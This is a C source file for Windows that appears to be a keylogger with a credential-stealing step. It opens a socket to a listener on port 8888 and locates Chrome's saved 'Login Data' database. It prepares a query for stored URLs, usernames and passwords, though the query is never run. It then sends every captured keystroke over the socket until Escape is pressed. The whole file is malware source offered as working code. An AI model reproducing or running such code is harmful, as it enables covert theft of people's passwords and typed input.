#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <conio.h>
#include <sqlite3.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")
static int callback(void *data, int argc, char **argv, char **azColName){
   int i;
   fprintf(stderr, "%s: ", (const char*)data);
   
   for(i = 0; i<argc; i++){
      printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
   }
   
   printf("\n");
   return 0;
}
int main() {
    char credential[1024];
    DWORD length;
    WSADATA wsa;
    SOCKET client_socket;
    struct sockaddr_in server_addr;
    char *message;
    char server_reply[2000];
    int recv_size;
    char capture;
    char char_to_str[2];
    sqlite3 *db;
    int rc;
    char *sql;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed. Error Code: %d", WSAGetLastError());
        return 1;
    }

    if ((client_socket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Could not create socket: %d", WSAGetLastError());
        return 1;
    }

    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Server IP address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8888);

    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        printf("Connect error: %d", WSAGetLastError());
        return 1;
    }
    
    printf("Connected to server.\n");
    length = GetEnvironmentVariableA("LOCALAPPDATA", credential, 1024);
    if (length == 0) {
        printf("Failed to retrieve local AppData: %d\n", GetLastError());
        return 1;
    }
    printf("Local appdata: %s\n", credential);
    strcat(credential, "\\Google\\Chrome\\User Data\\Default\\Login Data");
    printf("App data: %s\n", credential);
    rc = sqlite3_open(credential, &db);
    if (rc) {
        printf("Can not open database: %s\n", sqlite3_errmsg(db));
    } else {
        printf("Open success\n");
    }
    sql = "SELECT action_url, username_value, password_value FROM logins";


    while (1) {
        Sleep(10);
        if (kbhit()) {
            capture = getch();
            switch ((int)(capture)) {
                case ' ':
                    message = " ";
                    send(client_socket, message, strlen(message), 0);
                    break;
                case 0x09:
                    message = "[TAB]";
                    send(client_socket, message, strlen(message), 0);
                    break;
                case 0x0D:
                    message = "[ENTER]";
                    send(client_socket, message, strlen(message), 0);
                    break;
                case 0x1B:
                    message = "[ESC]";
                    send(client_socket, message, strlen(message), 0);
                    break;
                case 0x08:
                    message = "[BACKSPACE]";
                    send(client_socket, message, strlen(message), 0);
                    break;
                default:
                    char_to_str[0] = capture;
                    char_to_str[1] = '\0';
                    message = char_to_str;
                    send(client_socket, message, strlen(message), 0);
                    break;
            }
            if ((int) capture == 27) {
                break;
            }
        }
    }
    

    closesocket(client_socket);
    WSACleanup();

    return 0;
}
